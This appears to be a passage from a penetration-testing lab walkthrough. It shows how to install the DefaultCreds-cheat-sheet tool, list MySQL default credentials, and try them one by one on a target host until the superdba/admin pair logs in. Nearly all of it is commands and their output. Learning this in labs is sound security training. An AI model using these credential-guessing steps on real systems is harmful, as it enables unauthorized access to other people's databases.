## Spraying, Stuffing, and Defaults

1. clone [DefaultCreds-cheatsheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).

```
git clone https://github.com/ihebski/DefaultCreds-cheat-sheet
```

2. enter the repository.

```
cd DefaultCreds-cheat-sheet
```

3. create a virtual environment.

```
python3 -m venv .venv
```

4. activate it.

```
source .venv/bin/activate
```

5. install dependencies.

```
pip3 install -r requirements.txt
```

6. run the tool to search for mysql default credentials.

```
python ./creds search mysql
```

output:
```
+---------------------+-------------------+----------+
| Product             |      username     | password |
+---------------------+-------------------+----------+
| mysql               | admin@example.com |  admin   |
| mysql               |        root       | <blank>  |
| mysql (ssh)         |        root       |   root   |
| mysql               |      superdba     |  admin   |
| scrutinizer (mysql) |    scrutremote    |  admin   |
+---------------------+-------------------+----------+
```

7. ssh to the target with the provided credentials.

```
ssh sam@$target_ip
```

output:
```
sam@nix01:~$
```

8. brute force every default credential.

```
sam@nix01:~$ mysql -u admin@example.com -p
Enter password: admin
ERROR 1045 (28000): Access denied for user 'admin@example.com'@'localhost' (using password: YES)
sam@nix01:~$ mysql -u root -p
Enter password: 
ERROR 1698 (28000): Access denied for user 'root'@'localhost'
sam@nix01:~$ mysql -u root -p
Enter password: root
ERROR 1698 (28000): Access denied for user 'root'@'localhost'
sam@nix01:~$ mysql -u superdba -p
Enter password: admin
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 25
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```